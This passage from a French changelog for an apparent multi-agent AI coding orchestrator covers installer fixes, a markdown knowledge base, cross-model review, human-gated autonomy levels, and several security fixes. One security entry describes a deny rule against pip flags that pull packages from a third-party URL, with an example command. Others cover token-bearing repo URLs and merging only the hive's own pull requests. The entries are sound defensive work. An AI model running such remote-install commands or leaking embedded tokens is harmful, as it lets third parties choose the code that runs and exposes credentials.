  alors que le paquet, `NODE_MINIMUM`, `install.sh` et `install.ps1` disent tous 24. Sur une machine en Node 22 : `sh install.sh` refuse avec le code 2,
  `npm run install:hive` répond « ✔ Node v22.22.2 (20 minimum) » et invite à
  démarrer — une installation « réussie » là où `better-sqlite3` n'a pas de
  binaire prébuilt, c'est-à-dire **la panne de l'image morte atteinte par
  l'autre porte**. La garde existante s'intitulait « en quatre endroits » et en
  comptait quatre sur six ; `NODE_MIN` vaut désormais `NODE_MINIMUM`, et la
  commande de secours affichée — « nvm install 20 », la commande exacte pour
  rester bloqué — suit la même source. Journal § 1.6 et § 2.6.

- **🖥️ Le CORS proposé interdisait l'adresse que l'écran suivant annonce.**
  L'assistant posait `HIVE_CORS_ORIGIN=http://localhost:7777` (le dashboard
  compilé) pendant que l'installeur écrit deux écrans plus loin
  « `npm run dev:dashboard` (puis `http://localhost:5173`) ». Répondre « Poser
  ces réglages » ouvrait donc Mission Control sur un écran **vide, sans message
  d'erreur** — un navigateur bloqué par CORS ne dit rien. Les deux écrans
  avaient raison séparément ; c'est leur désaccord qui était le défaut, et aucun
  test ne le voyait puisqu'aucun ne les regardait ensemble. Les deux origines
  sont désormais listées, elles viennent d'une constante unique, et un test
  confronte l'adresse annoncée à celles qui sont autorisées. Journal § 2.7.

- **⏎ L'accueil promet trois décisions et en posait quatre.** La quatrième —
  « Ne rien changer / Poser ces réglages » — arrivait sur un `.env` que
  l'installeur venait lui-même de créer, avec « Ne rien changer » pour défaut :
  valider au ⏎ **jetait le choix d'exposition fait à l'écran précédent**. Elle
  disparaît sur un fichier neuf dont le plan n'ouvre rien, et reste entière dès
  que la machine devient joignable. Le nouveau `planOuvre` regarde le PLAN et
  non l'étiquette du choix, parce qu'un tunnel Cloudflare et un reverse proxy
  laissent `HIVE_HOST` sur `127.0.0.1` **et rendent pourtant la ruche joignable
  depuis Internet**.

### Added

- **📏 Les critères 1 et 2 sont MESURÉS, pas affirmés** (`docs/ETAPES.md`).
  **3 décisions** sur le chemin par défaut et **≈ 2,5 s** hors téléchargement
  npm, contre 60 s de budget — chiffres relevés sous un vrai pseudo-terminal,
  avec la commande reproductible et les réglages du banc écrits à côté. La note
  qu'ils remplacent disait « l'installeur a `--timings`, personne ne l'a
  mesuré » : **`--timings` n'existe pas**. Une note qui invente l'outil de sa
  propre mesure est le meilleur indice qu'elle n'a jamais été faite.

- **🏗️ Les Chantiers — la ruche sait quels travaux le dépôt DÉCLARE** (`src/shared/chantier.ts`).
  Une ouvrière produit un diff, il part en revue, et personne ne demande au
  PROJET ce qu'il en pense — alors qu'il le dit lui-même, dans ses propres
  commandes. Ce module lit les scripts déclarés, les classe, et rend l'argv à
  lancer. Deux règles le portent : **la ruche choisit dans ce que le dépôt
  déclare et n'invente jamais une commande** (même frontière que
  `preparation.ts` et `commande-test.ts`, établie en fermant de vraies failles),
  et **ce qui sort de la machine exige un humain** — publier, déployer,
  démarrer un service sont irréversibles et visibles de l'extérieur, donc même
  famille que « jamais de fusion sans revue humaine ». ⚠️ **Cette pièce est
  DÉBRANCHÉE** : elle décide, rien ne l'appelle encore. `docs/ETAPES.md` ouvre
  le lot 14 avec son état réel plutôt que de le laisser découvrir.

- **🕸️ Le filet de re-livraison espace ses tentatives.** La ruche re-sert
  `assign_task` aux tâches assignées restées muettes plus de cinq secondes —
  un filet pour un message perdu en vol. Il ne gardait aucune trace de ses
  tentatives : une tâche muette repartait **à chaque tick**. Le cas qui compte
  n'est pas le nœud mort (le moissonneur désassigne sa tâche, la boucle
  s'arrête seule) mais le nœud **vivant et bloqué** — il bat normalement, ne
  rend jamais compte de sa tâche, n'est donc jamais moissonné, et c'est lui que
  le filet arrosait sans fin. Un renvoi au plus toutes les **15 s** par tâche
  désormais, mémorisé en RAM plutôt qu'en rafraîchissant `updatedAt` : ce champ
  veut dire « la tâche a changé », or une re-livraison ne la change pas, et le
  teindre ferait passer une tâche gelée pour fraîche auprès du filet lui-même.
  Journal § 6bis.2.

- **🗣️ La contre-expertise PART enfin : un modèle reçoit vraiment le travail
  d'un autre à juger.** Le module décidait qui devait relire depuis deux PR, et
  personne ne lançait la relecture — le lot restait 🟡 avec un module complet et
  débranché. Désormais, quand une production entre en revue, la ruche crée une
  **vraie tâche** de relecture, la pose sur le nœud du modèle retenu et lui
  envoie `consigneDeCritique()` ; au retour, l'avis est lu, agrégé, et publié en
  `contre_expertise_verdict` avec ses objections. Une **table latérale**
  (`contre_expertises`) fait double emploi à dessein : elle marque la tâche
  comme relecture — sans quoi le résultat repartirait en contre-expertise et
  serait relu à son tour, **à l'infini**, chaque tour coûtant un vrai appel de
  modèle — et elle corrèle l'avis à la production jugée. Le geste d'envoi n'est
  pas réinventé : le corps de `onAssign` devient `envoyerTache`, une seule porte
  de sortie vers les ouvrières, donc un seul endroit où vivent le bac à sable,
  le cadre du polyéthisme et le contexte du Cerveau. **Le verdict ne bloque
  jamais la fusion** — « jamais de fusion sans revue humaine » reste la règle, et
  une contre-expertise qui déciderait remplacerait la revue au lieu de l'armer.

- **🔍 Le Cerveau s'EXPLORE : recherche, filtres, et une vue liste qui porte
  l'accessibilité.** L'onglet montrait le graphe ; on ne pouvait ni y chercher,
  ni s'y concentrer, ni le lire autrement qu'en pixels. Il gagne une
  **recherche** (insensible aux accents — « decision » trouve « Décision »,
  et sur le titre comme sur l'identifiant), des **filtres par genre**, un
  filtre **« dorment »** sur les notes jamais servies, et le **zoom, le
  déplacement et le glisser** d'une note. Cliquer une note l'isole avec son
  voisinage, et le panneau liste ses voisins, cliquables à leur tour.
  Le filtrage vient de `filtrer()`, pur et testé, qui tient une règle : **une
  arête ne survit que si ses deux bouts survivent** — garder un trait vers une
  note qu'on vient de masquer serait le mensonge des liens morts, en pire.
  Surtout, la **vue liste** n'est pas un repli dégradé : c'est un vrai tableau,
  navigable au clavier et lisible par un lecteur d'écran, portant les mêmes
  faits que le graphe. Le dépôt tient déjà `NO_COLOR`, `TERM=dumb` et l'absence
  de TTY — un écran qui n'existerait qu'en pixels serait le seul endroit où
  cette exigence s'arrête. Enfin, sous `prefers-reduced-motion` la simulation
  se fige une fois posée et le halo cesse de respirer, **sans rien perdre** :
  « a servi récemment » reste dit par la couleur et par le point creux.

- **🧠 Un onglet pour VOIR le Cerveau** (`#/cerveau`, administrateurs seulement).
  Le Cerveau grossissait tout seul — chaque échec y dépose un épisode — et
  personne ne le voyait : un dossier de markdown se lit note par note, et une
  note à la fois ne dit rien de la FORME de l'ensemble. L'onglet le montre en
  **graphe vivant**, à la manière d'Obsidian : les notes se repoussent, les
  liens les rapprochent, et une note qui apparaît **grandit** depuis zéro au
  lieu de surgir. L'usage est rendu visible sans un chiffre de plus à lire —
  un halo **respire** sur ce qui a servi récemment, et un point **creux** n'a
  jamais servi. Trois choix portent la vue : un lien mort n'est **pas** dessiné
  (le tracer vers le vide inventerait une note inexistante — il est listé à
  part, pour être réparé), un lien réciproque est **une seule** arête (deux
  colleraient les notes sans raison visible), et l'ordre est **total** (sinon
  le graphe saute à chaque rafraîchissement alors que rien n'a bougé). La
  physique est écrite à la main — répulsion, ressort, rappel au centre — parce
  que le critère « 0 nouvelle dépendance » vaut aussi pour le tableau de bord.
  Aucune écriture : promouvoir un épisode en leçon demande de comprendre
  POURQUOI, et ce geste reste dans Obsidian, avec un commit qu'on peut annuler.

- **🗣️ La contre-expertise sait LIRE un verdict** (`lireAvis`). Un relecteur
  répond en texte libre ; cette fonction en tire un avis exploitable par
  `agreger`. Le choix qui la porte : **un verdict illisible vaut « contesté »**,
  jamais « validé ». Compter le silence comme un feu vert produirait « relu,
  rien à signaler » sur un travail que personne n'a jugé — le mensonge
  rassurant que ce module refuse partout ailleurs. De même, « conteste »
  l'emporte sur « valide » quand les deux apparaissent : entre deux lectures
  possibles, on garde celle qui fait REGARDER. La réponse du relecteur est
  traitée comme une DONNÉE (neutralisée, bornée à 20 objections) — elle finit
  dans un événement lu par un humain.

- **🧠 Le Cerveau — le savoir qui survit à la fenêtre de contexte**
  (`src/shared/cerveau.ts`, `src/cerveau-reel.ts`, dossier `<données>/cerveau`).
  Une ruche qui travaille des MOIS referme une boucle : sa production
  d'aujourd'hui devient son contexte de demain. Hive Mind gardait des
  ÉPISODES — « la tâche 47 a réussi, voici ses logs » — et cette masse grossit
  sans fin, le bruit croissant plus vite que le signal. Un agent qui reprend un
  projet au troisième mois n'a pas besoin des mille épisodes : il a besoin des
  **vingt règles** qu'ils ont produites. Le savoir est donc rangé par GENRE
  (invariant, leçon, décision, carte, épisode) et l'ordre EST une priorité :
  **les invariants passent toujours**, et s'ils ne tiennent pas dans le budget
  la ruche **refuse** au lieu de tronquer — un contexte amputé d'une contrainte
  de sûreté mais qui a l'air complet est pire qu'une erreur, parce que personne
  ne va vérifier. Ce qui n'entre pas est listé, jamais tu (`cerveau_refus`). Les
  notes sont des **fichiers markdown** (en-tête YAML, `[[wikilinks]]`, ouvrables
  dans Obsidian) : un savoir en fichiers se versionne, donc se révise en revue
  et **revient en arrière** — `git revert` est le seul mécanisme d'oubli qui ait
  jamais marché. La méthode n'est pas une théorie : `docs/ERREURS.md` est
  exactement ça, tenu à la main depuis des semaines, et il a attrapé de vraies
  régressions.

- **🧠 La ruche alimente son propre cerveau.** Chaque échec pris en compte
  devient un épisode ; la panne est réduite à sa signature (`signatureEchec`,
  réutilisée d'`essaim.ts` plutôt que redoublée) et **la même panne incrémente
  une seule note** au lieu d'en semer cinquante — le dossier reste lisible par
  un humain, ce qui est toute la raison d'être du format. À **trois
  récurrences**, Hive **propose** la consolidation (`cerveau_consolidation`) et
  **ne rédige jamais la règle** : écrire une règle demande de comprendre
  POURQUOI, et une règle fausse coûte plus cher que pas de règle du tout —
  parce qu'elle est SUIVIE, et transmise à chaque tâche par le budget de
  contexte. La ruche accumule la matière ; l'humain écrit la loi. L'élagage
  tourne à l'heure et ne touche QUE les épisodes : élaguer une leçon
  reviendrait à jeter le résultat du travail pour garder la matière première.

- **⚖️ La contre-expertise — une IA relue par une AUTRE**
  (`src/shared/contre-expertise.ts`). Trois mécanismes confrontaient déjà des
  productions, et aucun ne faisait ça : Drone Wars prend le PREMIER résultat
  (vitesse), le Parlement compte les résultats IDENTIQUES (accord), le Conseil
  délibère sur une DIRECTION (cadrage). L'accord n'est pas la critique — deux
  modèles peuvent tomber d'accord parce qu'ils se trompent pareil, et c'est même
  le cas le plus probable quand ils partagent une famille d'entraînement. Une
  critique ne vaut donc que si elle vient d'un modèle **différent** : faire
  relire `claude-code` par `claude-code`, c'est lui demander de trouver ses
  propres angles morts. Faute d'un second modèle en ligne, Hive **refuse**
  plutôt que de dégrader — « relu » sur un travail auto-relu est un mensonge
  dans le sens rassurant. Un relecteur par modèle (la diversité devient
  structurelle), le `shell` simulé écarté (il fabriquerait un verdict crédible
  sans rien exécuter), et **une seule objection suffit à contester** : c'est
  pour entendre l'autre voix qu'on a changé de modèle, un vote majoritaire la
  noierait. À chaque production, l'événement `contre_expertise` nomme le modèle
  capable de relire — **ou dit pourquoi c'est impossible**, parce que tu,
  « aucun second modèle » se confondrait avec « on a relu et rien trouvé ».

- **🎚️ `hive mode` — basculer l'autonomie sans quitter le clavier.** L'échelle
  existait (`off` / `propose` / `gouverne` / `plein`) et la route pour la
  changer aussi, mais rien en ligne de commande ne permettait de la LIRE ni de
  la POSER : il fallait fabriquer un `curl`. **Seule la MONTÉE se confirme** —
  descendre retire des droits à la ruche, c'est toujours sûr, et demander
  « êtes-vous sûr ? » pour reprendre la main est le meilleur moyen d'apprendre
  à taper « oui » sans lire, donc de rendre la confirmation inutile le jour où
  elle compte. Chaque palier annonce aussi **ce qu'il ne fait pas** :
  « gouverne » sans « ne fusionne jamais » se lirait comme un blanc-seing.
  Codes de sortie distincts (3 = accord manquant, 1 = mot inconnu) pour qu'un
  script distingue les deux.

- **🐳 Image, compose et sauvegarde** (`Dockerfile`, `docker-compose.yml`,
  `hive sauvegarde`). L'image est en `node:24-bookworm-slim` et **surtout pas
  Alpine** : `better-sqlite3` n'y a pas de binaire prébuilt, la compilation
  échouerait, et comme la dépendance est OPTIONNELLE l'image serait « réussie »
  avec un démarrage mort. La sauvegarde passe par **`VACUUM INTO`, jamais une
  copie de fichier** — mesuré avant d'écrire une ligne, sur 5 000 insertions en
  mode WAL : `VACUUM INTO` rend 5 000/5 000 lignes, `cp` en rend 4 741, et la
  copie passe `integrity_check`. 259 lignes disparues en silence dans un
  fichier qui a l'air valide, c'est la pire forme de sauvegarde : celle qu'on
  croit avoir. Écriture sous un nom `.part`, publication par renommage
  atomique, élagage APRÈS publication.

- **🧹 `hive desinstaller` et `hive service`.** L'inventaire de tout ce que Hive
  écrit vit dans un module pur (`src/shared/empreinte.ts`) et un test garde que
  **tout fichier de `src/` qui écrit y figure** — un dossier oublié serait un
  dossier que la désinstallation ne montrerait jamais. `.env`, la base, les
  sauvegardes et le cerveau ne sont **jamais** retirables : « un outil
  d'installation n'est pas un outil de destruction ». Le service s'installe en
  systemd user, LaunchAgent ou tâche planifiée, avec un plan pur vérifiable
  pour les trois plateformes depuis n'importe laquelle.

- **🔑 Les clés de la ruche ont un écran** (panneau dans l'Intendance, routes
  `GET /api/membres`, `DELETE /api/membres/:nodeId`, `DELETE /api/billets/:id`).
  Révoquer une clé compromise est l'archétype de la décision d'administration,
  et elle n'existait qu'en ligne de commande : le tableau de bord montrait le
  pouls, les anomalies, les castes et les comptes — mais pas « qui a une clé de
  ma ruche ». **Les deux gestes sont séparés et leurs conséquences écrites**,
  parce qu'ils n'ont rien d'interchangeable : une CLÉ appartient à une machine
  et la révoquer la déconnecte tout de suite ; un BILLET ne vaut rien par
  lui-même — il sert à obtenir une clé, à usage compté — et le révoquer ne
  déconnecte personne. Confondre les deux, c'est croire avoir exclu quelqu'un en
  révoquant le billet par lequel il est entré ; un test fait les deux gestes à
  la suite sur la même ruche pour que cette confusion soit rouge. Les empreintes
  ne sortent jamais de la liste.

- **🗣 Le Conseil des Éclaireuses a un écran** (panneau dans la carte projet,
  routes `GET /api/conseils` et `GET /api/conseil/:sessionId`). Le Conseil ne
  change RIEN : sa sortie **EST une proposition à un humain**, exactement comme
  la Miellerie propose un merge sans jamais le faire. Il a pourtant vécu sans
  aucune interface — l'humain devait ouvrir un terminal pour lire ce qu'on avait
  délibéré pour lui. C'est le cas le plus net de « mécanisme sans écran » du
  dépôt, plus net que Les Guetteuses, dont la sortie était au moins une alerte.
  **On montre les propositions ÉCARTÉES, pas seulement la retenue** : trois des
  quatre pièges que le protocole évite ne se voient que là. Le **signal d'arrêt**
  motivé — une piste qu'une éclaireuse est allée vérifier et a jugée mauvaise —
  est l'information la plus chère du conseil, et elle ne vit que dans une
  perdante. La **diversité des familles** est affichée à côté du nombre de
  soutiens, parce que dix instances du même modèle qui s'accordent ne font pas
  dix avis. Et une issue sans recommandation (`vide`, `sans_quorum`, `epuise`,
  `depart`) se **dit** : « personne n'a rien trouvé » est un résultat, un écran
  vide ressemblerait à une panne. Enfin, la liste rend l'issue RANGÉE (nulle tant
  qu'on délibère) alors que le détail RECALCULE ce que le protocole dirait
  maintenant : le détail annonce donc son verdict **provisoire** tant que le
  conseil est ouvert, sinon le résumé aurait l'air de contredire son propre
  détail.

- **🐙 Le connecteur GitHub a un écran** (panneau « Connecter un dépôt GitHub »
  en tête de la vue Projets). `GET /api/github/repos` et
  `POST /api/github/import` vivaient depuis le début sans aucune interface :
  connecter un dépôt se faisait en ligne de commande, alors que c'est le tout
  PREMIER geste de quelqu'un qui arrive avec du code existant. Le panneau liste
  les dépôts (plus récents d'abord), marque privé / archivé / langage, signale
  ceux **déjà connectés** — deux projets sur un même dépôt, c'est deux plans de
  merge concurrents sur les mêmes fichiers — et connecte en un clic.
  **L'écran ne demande jamais le jeton GitHub** : il vit dans l'environnement de
  l'orchestrateur, en mémoire, le temps du processus. Un champ « collez votre
  jeton » en ferait une valeur qui traverse le navigateur, l'historique et le
  presse-papiers, pour un gain nul — c'est l'orchestrateur qui appelle GitHub,
  pas le navigateur. Quand le jeton manque, le 501 du serveur porte déjà la
  marche à suivre : on l'affiche telle quelle plutôt que d'en inventer une qui
  dériverait. **Et le dépôt connecté appartient désormais à qui l'a connecté** :
  l'import s'authentifiant par le jeton de ruche, il rangeait le projet
  orphelin, donc inutilisable par son importateur jusqu'à ce qu'un
  administrateur l'adopte. La voie CLI reste orpheline — elle n'a que le jeton
  de ruche — et c'est le cas que l'adoption rattrape.

### Tests

- **La boucle complète d'une caste, du travail réel au cadre injecté**
  (`tests/caste-boucle.test.ts`). Le module pur était éprouvé (à antécédents
  donnés, quelle caste) et le câblage aussi (à caste donnée, quel cadre) — mais
  les deux **semaient les inspections à la main**. Le maillon qu'aucun ne
  parcourait était celui du milieu : un nœud rend une production → les
  Gardiennes l'inspectent à la RÉCEPTION → l'inspection se range → le corpus
  borné la relit → la caste change → la tâche SUIVANTE reçoit un autre cadre.
  Cinq maillons, chacun testé, et rien ne vérifiait qu'ils étaient attachés. Le
  test fait le trajet sur un vrai nœud WebSocket, sans rien semer. Il verrouille
  surtout **« pas de cliquet »** — une caste se perd exactement comme elle se
  gagne (doctrine, règle 3) — sur le CORPUS RÉEL, borné et relu à l'envers, là
  où un cliquet se cacherait sans qu'on le voie ; la règle n'était vérifiée que
  sur des antécédents fabriqués. Au passage, le test a d'abord accusé les
  Gardiennes de ne pas mordre sur un diff vide : c'était **le test qui avait
  tort**, les Gardiennes ne crient au diff vide que si un diff POUVAIT exister
  (dépôt connecté, promesse nommée, zéro octet rendu) — c'est écrit dans le
  fichier pour que la prochaine lecture ne refasse pas l'erreur.

### Fixed

- **🐳 L'image pouvait naître morte : `npm ci` sort avec 0 quand une dépendance
  OPTIONNELLE a échoué.** Les quatre paquets nécessaires au démarrage — Fastify,
  ses deux greffons, `better-sqlite3` — sont optionnels à dessein : un nœud
  membre, qui ne fait que prêter du temps-machine, n'en a pas l'usage. Mais
  « optionnel » veut dire, pour npm : _si l'installation échoue, je continue_.
  `better-sqlite3` télécharge un binaire prébuilt ; quand ce téléchargement rate,
  npm avertit, retire le paquet, **et réussit**. Constaté sur deux constructions
  du **même Dockerfile et du même lock** à quatre minutes d'écart — la seconde a
  produit une image verte dont la ruche est morte au démarrage sur
  « better-sqlite3 est absent », alors que le commit ne touchait que deux
  fichiers Markdown. La couche qui installe **charge désormais les quatre
  paquets, ouvre une base en mémoire et y relit une ligne** avant de se déclarer
  bonne, et une reprise borne l'aléa réseau. Deux points portent le correctif :
  la reprise s'appuie sur la vérification et **non sur le code de sortie**, qui
  vaut 0 précisément dans le cas à rattraper ; et la vérification qui décide est
  celle qui suit le `done`, une boucle shell sortant avec 0 même quand toutes ses
  tentatives ont échoué. Journal § 1.5.

- **🔒 `champSurUneLigne` laissait passer U+2028 et U+2029.** Le nettoyeur
  PARTAGÉ du dépôt — celui sur lequel s'appuient le Cerveau, la Couveuse et la
  contre-expertise — ne connaissait que `\r`, `\n` et la tabulation. U+2028
  (LINE SEPARATOR) et U+2029 (PARAGRAPH SEPARATOR) le traversaient intacts,
  alors que ce sont des retours à la ligne pour un terminal, un navigateur et la
  plupart des rendus : une fonction qui promet « sur une seule ligne » ne tenait
  pas sa promesse, et c'est précisément le genre de caractère qu'on emploie
  parce qu'une garde naïve ne le voit pas. La classe couvre désormais
  `\r \n \t \v \f U+0085 U+2028 U+2029`, avec un test par séparateur.
  Journal § 2.3 bis.

- **🔎 Une objection de relecture contenant U+2028 était SILENCIEUSEMENT
  PERDUE.** En JavaScript, `.` ne traverse pas ce caractère : avec
  `/^\s*[-*]\s+(.+)$/`, la ligne n'était pas capturée du tout — dans le seul
  module dont la raison d'être est de ne pas perdre d'objection. Corrigé en
  `[\s\S]`, la neutralisation prenant le relais.

- **⏱️ Le plafond de délai avait un jumeau, et il était resté à 10 s.**
  `testTimeout` avait été porté à 20 s après analyse — mais `hookTimeout` est un
  réglage **distinct** chez vitest, et relever le premier laisse le second à son
  défaut. Deux hooks ont donc expiré sous Windows sur `main`
  (`tests/billet-motifs.test.ts:48`, `tests/tableau-endpoint.test.ts:45`) à
  10 000 ms et non 20 000. L'oubli était mal placé : le raisonnement qui
  justifiait les 20 s décrit ce que font les **hooks** — c'est `beforeEach` qui
  monte un vrai serveur sur une vraie base SQLite, et `afterEach` qui l'arrête
  et efface l'arborescence. On donnait le plafond large à l'interrogation d'un
  serveur déjà prêt, et le plafond serré à sa construction. Mesuré ici, un cycle
  complet coûte **moins de 200 ms**. Les deux plafonds sont alignés, et
  `tests/reglages-vitest.test.ts` interdit désormais qu'ils divergent — un
  réglage ABSENT n'a pas de valeur fausse à relire, il applique son défaut en
  silence. Journal § 3.2 bis.

- **📓 Le CHANGELOG se répétait trois fois — 286 lignes, un cinquième du
  fichier.** Un bloc de 144 lignes figurait à l'identique sous `[Unreleased]`,
  une seconde fois plus bas, et une troisième **dans la section `[0.2.0]`** —
  c'est-à-dire dans de l'histoire déjà publiée. Le défaut est apparu à 25 lignes
  et a grossi à chaque livraison pendant huit commits (25 → 46 → 60 → 79 → 97 →
  117 → 146) sans que personne le voie : une duplication est **invisible dans un
  diff**, qui montre la ligne ajoutée mais jamais qu'elle existe déjà trois
  écrans plus bas. Les copies sont retirées sans perdre une seule ligne unique,
  et le contenu qui les suivait retrouve l'en-tête que la duplication lui avait
  pris. `tests/documents-qui-grossissent.test.ts` garde désormais les cinq
  documents qui ne font que grandir — il rougit sur le fichier tel qu'il était
  **à la première apparition du défaut**, pas seulement à la huitième.
  **La cause est élucidée depuis** : l'entrée était insérée avant `### Fixed`,
  motif présent **trois fois** dans le fichier, avec un `str.replace` sans
  compte — or Python remplace TOUTES les occurrences par défaut. Les trois
  points d'insertion des hunks correspondent exactement aux trois `### Fixed`.
  Journal § 6bis.1.

- **La préparation laissait déplacer la source par la forme COURTE d'un drapeau,
  et par la valeur d'un autre.** Deux trous dans une règle que le module énonce
  pourtant clairement (« refusés même quand la sous-commande est bonne »).
  D'abord `--find-links` était banni pendant que **`-f`, le même drapeau**,
  figurait parmi les drapeaux à valeur et passait tranquillement : interdire un
  nom en laissant son synonyme ouvert ne ferme rien. Ensuite
  `pip install -r http://ailleurs/requirements.txt` était accepté — la LETTRE de
  la règle est respectée (c'est un fichier qui nomme les paquets, pas la
  commande) et son esprit trahi exactement comme avec `--index-url` : c'est un
  tiers qui décide de ce qui s'installe. La même porte, ailleurs. Les formes
  courtes `-i` et `-f` rejoignent les drapeaux de source, et la valeur d'un
  `-r`/`--requirement`/`-c` doit désigner un fichier DU DÉPÔT — un chemin local,
  y compris en sous-dossier, passe toujours.

### Tests

- **La propriété qui rend les exemples de `zoneModifiee` justes**
  (`tests/retouche.test.ts`). Les dix-huit tests de ce module testaient par
  l'EXEMPLE — telle entrée, tel triplet — et **un bug réel les traversait tous** :
  en retirant la borne qui empêche le préfixe et le suffixe communs de se
  chevaucher, tout restait vert alors que `zoneModifiee(['a'], ['a','a'])`
  rendait `null`, c'est-à-dire « rien n'a bougé » sur une insertion réelle (la
  retouche aurait été refusée pour « aucun changement » à quelqu'un qui venait
  d'écrire une ligne). La propriété ajoutée dit ce que la fonction PROMET — ce
  qu'on rogne aux deux bouts est réellement commun, donc les DEUX fichiers se
  reconstruisent depuis la zone — et se vérifie sur les 961 paires de suites de
  longueur ≤ 4 : exhaustif sur les petits cas, donc reproductible, plutôt
  qu'aléatoire.

- **La ruche fusionnait n'importe quelle pull request du dépôt.**
  `POST /api/livraison/fusion` disait, dans son propre commentaire, « fusionne
  une pull request ouverte par la ruche » — et acceptait n'importe quel numéro.
  Elle fusionnait donc, **avec le jeton GitHub de l'hôte**, la PR qu'un humain
  était en train de relire, ou celle d'un contributeur extérieur. Le geste est
  réputé humain, mais le jeton qui l'autorise se recopie sur chaque machine
  membre (ADR 0007). Le défaut n'était visible dans aucune des deux routes : il
  tenait à une **troisième chose, que ni l'une ni l'autre ne faisait**. La voie
  autonome range ses livraisons dans la table `livraisons` ; la voie MANUELLE se
  contentait d'émettre un événement, si bien que le numéro de PR n'existait
  nulle part où le retrouver — ni pour rouvrir « où en est ma livraison ? », ni
  pour vérifier quoi que ce soit à son sujet. Les deux moitiés sont réparées :
  la livraison manuelle range comme l'autonome, la fusion **ne fusionne que ce
  que la ruche a ouvert**, et l'état suit la fusion (une livraison fusionnée qui
  resterait « ouverte » ferait mentir l'écran et rouvrirait la porte à une
  seconde fusion). Le refus nomme l'alternative : les autres pull requests se
  fusionnent sur GitHub — c'est votre dépôt, pas le sien.

- **Un compte recevait 401 sur le rapport de son PROPRE projet.** Onze routes de
  l'espace projet se gardent par le seul jeton de ruche, sans aucune règle par
  projet, là où Le Rayon, les membres et les partages se gardent par COMPTE. Le
  tableau de bord ne s'en apercevait pas — il envoie les deux en-têtes — mais
  toute autre intégration s'y cognait. Six lectures (`merge`, `merge/result`,
  `conflicts`, `balance`, `essaim`, `abonnement`) acceptent désormais AUSSI un
  compte ayant affaire au projet. **C'est une ouverture stricte** : aucune porte
  existante n'est retirée, la CLI et le mode « tableau de bord sans compte »
  continuent de marcher à l'identique. ⚠ **Cela ne résout pas le fond**, et
  `docs/adr/0007-portee-du-jeton-de-ruche.md` l'écrit : le README annonce que
  `HIVE_TOKEN` se recopie sur chaque machine membre, donc toute abeille de
  l'essaim lit encore le plan de merge et la balance de n'importe quel projet —
  et peut **déclencher un merge**, ce qui fait exécuter la commande de test du
  dépôt sur la machine d'un autre membre. Resserrer change le contrat du produit
  (la CLI n'a que le jeton de ruche) : c'est une décision d'hôte, posée dans
  l'ADR avec ses trois voies et leurs coûts. Un test **constate** l'état actuel
  et **échouera** le jour où quelqu'un tranchera — pour que ce soit un geste
  conscient et non une découverte.

- **Un projet créé depuis le tableau de bord n'appartenait à personne** — sur le
  parcours le PLUS courant du produit. `POST /api/projects` s'authentifie par le
  jeton de RUCHE : il n'a personne à qui attribuer le projet, et le magasin range
  par défaut `visibility: 'private'`, `ownerId: null`. Une fois le contrôle
  d'accès posé, la conséquence devient absurde — la personne qui vient de créer
  son projet ne peut ni en lire le code, ni y admettre quelqu'un, ni le partager,
  sauf à être administratrice. `POST /api/projects/user` existait depuis le début
  pour ça : il attribue le projet au compte appelant et l'inscrit comme membre
  `owner`. **Personne ne l'appelait.** Le défaut n'était donc dans aucune route,
  il était dans ce qu'aucune ne faisait — exactement le motif de l'adoption. La
  porte « jeton de ruche » reste ouverte (le tableau de bord s'utilise sans
  compte) et produit toujours un orphelin, ce qui est précisément le cas que
  l'adoption rattrape. Vérifié au navigateur avec un compte SIMPLE MEMBRE, pas
  administrateur — sinon `voir_tous_les_projets` masquerait le défaut : elle crée
  son projet, lit son code (200), le partage (200), et l'écran d'équipe la montre
  « owner ».

- **Le jeton du dépôt s'affichait encore sur la carte projet** (troisième
  endroit, troisième découverte séparée). Un `repoUrl` porte un secret
  POTENTIEL : la façon de donner ses identifiants à `git clone` sans
  configuration, c'est de les écrire dedans (`https://user:ghp_…@github.com/…`),
  et le champ « dépôt » du formulaire de création l'accepte tel quel. La fuite a
  été fermée sur le catalogue public, puis dans la vue Rayon — et la carte
  projet l'affichait toujours brut, en texte **et** en attribut `title`, juste à
  côté de la vue qui, elle, le lavait. Cette carte est vue par toute abeille qui
  rejoint la ruche : c'est même le but du tableau de bord. Le correctif a donc
  été écrit deux fois avant d'être complet, et ce n'est pas un défaut
  d'attention — c'est qu'aucun test ne portait sur la RÈGLE, seulement sur
  chacun de ses endroits. Deux gardes nouvelles la portent désormais :
  `tests/repourl-affichage.test.ts` refuse qu'une vue lise `x.repoUrl` sans
  passer par `sansIdentifiants`, et `tests/parcours-jeton-depot.test.ts` suit un
  projet dont l'URL porte un secret sur TOUT son trajet — adopté, ouvrière
  admise, partagé, lu — et vérifie que le secret n'apparaît dans aucune réponse,
  refus du miroir compris (« git a échoué sur <URL> » est l'explication la plus
  naturelle à écrire, et la pire). Ce dernier porte son propre méta-test : une
  réponse vide ou refusée ne prouve rien, et un test qui n'a rien regardé est le
  pire des verts.

### Added

- **🔗 Le partage en lecture A ENFIN UN ÉCRAN — aux deux bouts** (vue
  `dashboard/src/views/Partage.tsx`, panneau de création dans la vue Projets,
  aiguillage dans `main.tsx`). Le mécanisme était entier côté serveur — jeton
  distinct, deux actes, expiration, révocation individuelle, tests — et n'avait
  **aucune interface** : ni pour créer un lien, ni pour en lire un. Une personne
  à qui on envoyait l'URL arrivait sur la mire de connexion d'une ruche où elle
  n'a pas de compte. C'était documenté comme si ça marchait, ce qui est pire que
  de ne pas l'avoir. **L'acte `voir_avancement` était lui aussi déclaré et
  inutilisable** : les trois seules routes qui acceptaient un lien demandaient
  toutes `lire_code`, si bien qu'un lien « voir l'avancement » ne montrait jamais
  d'avancement. `GET /report` l'accepte désormais — et **rend `contributingNodes`
  vide** pour un lien : les identifiants de nœuds nomment les machines de gens
  qui n'ont pas consenti à figurer dans un lien qu'on fait circuler.
  L'aiguillage est **avant `App`**, pas dedans : `App` ouvre le flux WebSocket
  avec le jeton de ruche dès son montage et sonde le pouls, ce qu'un porteur de
  lien ne peut pas faire — et les hooks partent avant qu'une branche interne ait
  fini de choisir. Le jeton vit dans `sessionStorage` (il meurt avec l'onglet,
  exactement la durée d'un lien qu'on vous a montré, et il ne contamine pas
  l'onglet où vous êtes connecté à votre compte) et il est **retiré de la barre
  d'adresse** après lecture : il voyage après le `#`, donc aucun journal
  d'accès ne le voit, et une capture d'écran ne doit pas suffire à refaire le
  lien. Côté client, **un seul helper** (`apiLecture`) porte les lectures
  partageables, en miroir de `projetLisible()` côté serveur : deux familles de
  fonctions donneraient deux listes à tenir d'accord, et c'est toujours celle
  qu'on oublie qui décide. La retouche, elle, reste sur `apiCompte` — un porteur
